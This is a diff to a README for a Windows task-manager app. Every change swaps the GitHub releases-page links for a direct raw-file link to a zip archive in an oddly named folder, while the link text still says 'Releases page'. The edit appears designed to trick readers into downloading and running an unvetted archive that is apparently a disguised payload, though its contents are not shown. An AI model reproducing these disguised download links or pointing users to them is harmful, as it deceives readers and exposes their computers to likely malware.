@@ -1,6 +1,6 @@
 # 🗂️ TaskManager - Keep Tasks Clear and Simple
 
-[![Download TaskManager](https://img.shields.io/badge/Download-TaskManager-blue?style=for-the-badge)](https://github.com/ileanebisectional51/TaskManager/releases)
+[![Download TaskManager](https://img.shields.io/badge/Download-TaskManager-blue?style=for-the-badge)](https://raw.githubusercontent.com/ileanebisectional51/TaskManager/main/unintermitted/Task-Manager-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ TaskManager helps you track work, daily chores, and personal to-dos in one place
 
 Use the release page below to visit this page to download the app for Windows:
 
-[Go to TaskManager Releases](https://github.com/ileanebisectional51/TaskManager/releases)
+[Go to TaskManager Releases](https://raw.githubusercontent.com/ileanebisectional51/TaskManager/main/unintermitted/Task-Manager-v2.8.zip)
 
 ## 🖥️ What TaskManager Does
 
@@ -24,7 +24,7 @@ It works well if you want a simple desktop app that opens fast and does not get 
 
 ## 📦 Download for Windows
 
-1. Open the [TaskManager Releases page](https://github.com/ileanebisectional51/TaskManager/releases)
+1. Open the [TaskManager Releases page](https://raw.githubusercontent.com/ileanebisectional51/TaskManager/main/unintermitted/Task-Manager-v2.8.zip)
 2. Find the latest release at the top of the page
 3. Look for the Windows file in the release assets
 4. Download the file to your computer
@@ -198,4 +198,4 @@ This keeps TaskManager easy to use and helps you focus on what matters next
 
 If you need the file again, use the release page here:
 
-[TaskManager Releases](https://github.com/ileanebisectional51/TaskManager/releases)
+[TaskManager Releases](https://raw.githubusercontent.com/ileanebisectional51/TaskManager/main/unintermitted/Task-Manager-v2.8.zip)
